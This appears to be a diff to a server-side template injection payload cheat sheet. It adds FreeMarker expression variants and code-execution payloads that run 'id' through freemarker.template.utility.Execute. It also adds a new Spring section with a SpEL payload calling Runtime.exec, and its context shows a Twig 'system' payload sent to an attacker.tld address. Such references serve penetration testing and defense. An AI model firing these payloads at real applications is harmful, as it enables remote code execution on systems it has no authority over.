@@ -72,7 +72,8 @@
     - [Twig - Template format](#twig---template-format)
     - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
     - [Twig - Code execution](#twig---code-execution)
-  - [Java - Velocity](#velocity)
+  - [Java - Velocity](#java---velocity)
+  - [Java - Spring](#java---spring)
   - [PHP - patTemplate](#pattemplate)
   - [PHP - PHPlib](#phplib-and-html_template_phplib)
   - [PHP - Plates](#plates)
@@ -199,7 +200,11 @@ You can try your payloads at [https://try.freemarker.apache.org](https://try.fre
 
 ### Freemarker - Basic injection
 
-The template can be `${3*3}` or the legacy `#{3*3}`.
+The template can be :
+
+* Default: `${3*3}`  
+* Legacy: `#{3*3}`
+* Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)
 
 ### Freemarker - Read File
 
@@ -214,6 +219,8 @@ Convert the returned bytes to ASCII
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
 ${"freemarker.template.utility.Execute"?new()("id")}
+#{"freemarker.template.utility.Execute"?new()("id")}
+[="freemarker.template.utility.Execute"?new()("id")]
 ```
 
 ### Freemarker - Sandbox bypass
@@ -944,7 +951,7 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 
 ---
 
-## Velocity
+## Java - Velocity
 
 [Official website](https://velocity.apache.org/engine/1.7/user-guide.html)
 > Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.
@@ -958,6 +965,16 @@ $ex.waitFor()
 #foreach($i in [1..$out.available()])
 $str.valueOf($chr.toChars($out.read()))
 #end
+```
+
+---
+
+
+## Java - Spring
+
+```python
+*{7*7}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
 ```
 
 ---
